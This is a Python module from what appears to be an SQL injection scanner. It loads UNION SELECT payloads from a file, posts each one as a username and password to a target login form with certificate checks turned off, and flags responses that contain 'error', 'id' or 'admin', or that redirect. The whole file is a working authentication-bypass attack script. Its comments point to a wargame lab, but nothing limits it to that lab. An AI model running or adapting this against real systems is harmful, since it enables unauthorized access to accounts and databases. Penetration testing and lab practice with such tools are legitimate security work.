import os
import asyncio
import re
import requests
from colorama import Fore,init
from datetime import datetime
import socket
# from database import create_database_for_Captures
import sqlite3
import logging
import sys
parent_dir = os.path.dirname(os.path.abspath(__file__))
sys.path.append(parent_dir)
import sys
import os
import logging

current_directory = os.getcwd()

sys.path.append(current_directory)


attack_type = "authentication bypass SQL injection"
from lib.scripts.headers import Prepare_the_headers
from lib.scripts.headers import headers
from lib.scripts.headers import header
from  lib.regelexpression.patterns import Detect
from lib.priority.Priority import PRIORITY
from lib.priority.Priority import HARMFULL
from logger.logs import logger
from lib.result.Results import safe_SQLJNG_result
from lib.result.Results import SQLJNG_result_report
from Exceptions.exceptions import SQLJNGStackRangeError
from lib.Stacks.stack import html_response
from lib.Attacktype.Attacks import HeaderAttacks
from logger.sqljlog import logger as sqljlog

attack_type = "Header_union_sselect_sql_injection"

logging.basicConfig(filename="SQLJ.log",level=logging.DEBUG)

pattern = r"\berror\b"
htmlpattern = r"\bid\b"
UNIOn_capture = []

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
}



""" 
              Reference : https://github.com/payloadbox/sql-injection-payload-list 
              for The payloads"""





async def union_based_SQL_inj_HEADER(urls):
    """UNION SELECT is a technique used in SQL injection attacks to combine the results of two or more SELECT statements into a single result set. """
    """This attack is when we inject some malicious code to the database and extract some code out of it. """
    try:
        global pattern,htmlpattern,headers
        done = False
        filename = "UnionselectInj.txt"
        current_directory = os.path.dirname(os.path.abspath(__file__))
        file_path = os.path.join(current_directory, filename)

        with open(file_path, "r") as file:
            payload = file.read()
            rows = payload.split("\n")
            sorted_rows = sorted(rows)
            sorted_payload = "\n".join(sorted_rows)
            print(Fore.RED + str(sorted_payload))
            requests.packages.urllib3.disable_warnings()  
            # url = "https://redtiger.labs.overthewire.org/level1.php"
            req = requests.get(url=urls,verify=False)
            if req.status_code == 200:
                ask = input(f"[{datetime.now()}]"+Fore.GREEN + f"Looks like the host is up with the url: {urls } \nDo you want to send the payload to the website according to the above payload? ")
                logger.info(f"Payload :{sorted_payload} is ready.")
                
                if ask.lower() == "y":
                    sqljlog.info(f"Testing:{HeaderAttacks.UNION_BASED_SQL_INJECTION.value}")
                    for line in sorted_payload.split("\n"):
                        sqljlog.info(f"Testing:{line if len(line) <50 else line.split("\n")}")

                        params = {
                            "username": line,
                            "password": line
                        }
                        ack = requests.post(url=urls, data=params,verify=False,headers=headers)
                        logger.info(f"Sending payload:{line}")
                        await asyncio.sleep(5)
                        if "error" in ack.text:
                            logger.info("error parameter might exists in the status response.")
                            Detect(ack.text)
                            html_response.push(ack.text)
                            
                        vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE)
                        htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE)
                        if vuln:
                            logger.info("id parameter might exists in the code")
                            Detect(ack.text)
                            html_response.push(ack.text)
                            await asyncio.sleep(3)
                            
                        
                        if htmlVULN:
                            logger.info("error parameter might exists in the code.")
                            Detect(ack.text)
                            html_response.push(ack.text)
                            await asyncio.sleep(3)
                            
                        
                        word = "id" in req.text
                        errword = "error" in req.text
                        if word:
                            logger.info("id parameter might exists in the code.")
                            Detect(ack.text)
                            html_response.push(ack.text)
                            await asyncio.sleep(3)
                        
                        if errword:
                            logger.info("error parameter might exists in the code.")
                            Detect(ack.text)
                            html_response.push(ack.text)
                            await asyncio.sleep(3)
                            
                        
                            
                    if ack.status_code == 302:
                        logger.info("could break to the target")
                        await asyncio.sleep(3)
                        done = True
                        
                        
                    if "Admin" in vuln or "admin" in vuln or "Admin" in ack.text or "admin" in ack.text or "Admin" in htmlVULN or "admin" in htmlVULN:
                        logger.info("Could find admin parameter")
                        Detect(ack.text)
                        html_response.push(ack.text)
                        await asyncio.sleep(3)
                        
                        
                else:
                    # continue
                    pass
                        
            else:
                logger.error("HOST is down.")
                

                        
                    
    except Exception as e:
        logger.error(e)

        

 
        
    finally:
        try:
            await SQLJNG_result_report(html_response)

        except SQLJNGStackRangeError:
            result = safe_SQLJNG_result(html_response)
            for res in result:
                logger.info(res)
        
                
# asyncio.run(union_based_SQL_inj("https://redtiger.labs.overthewire.org/level1.php"))
  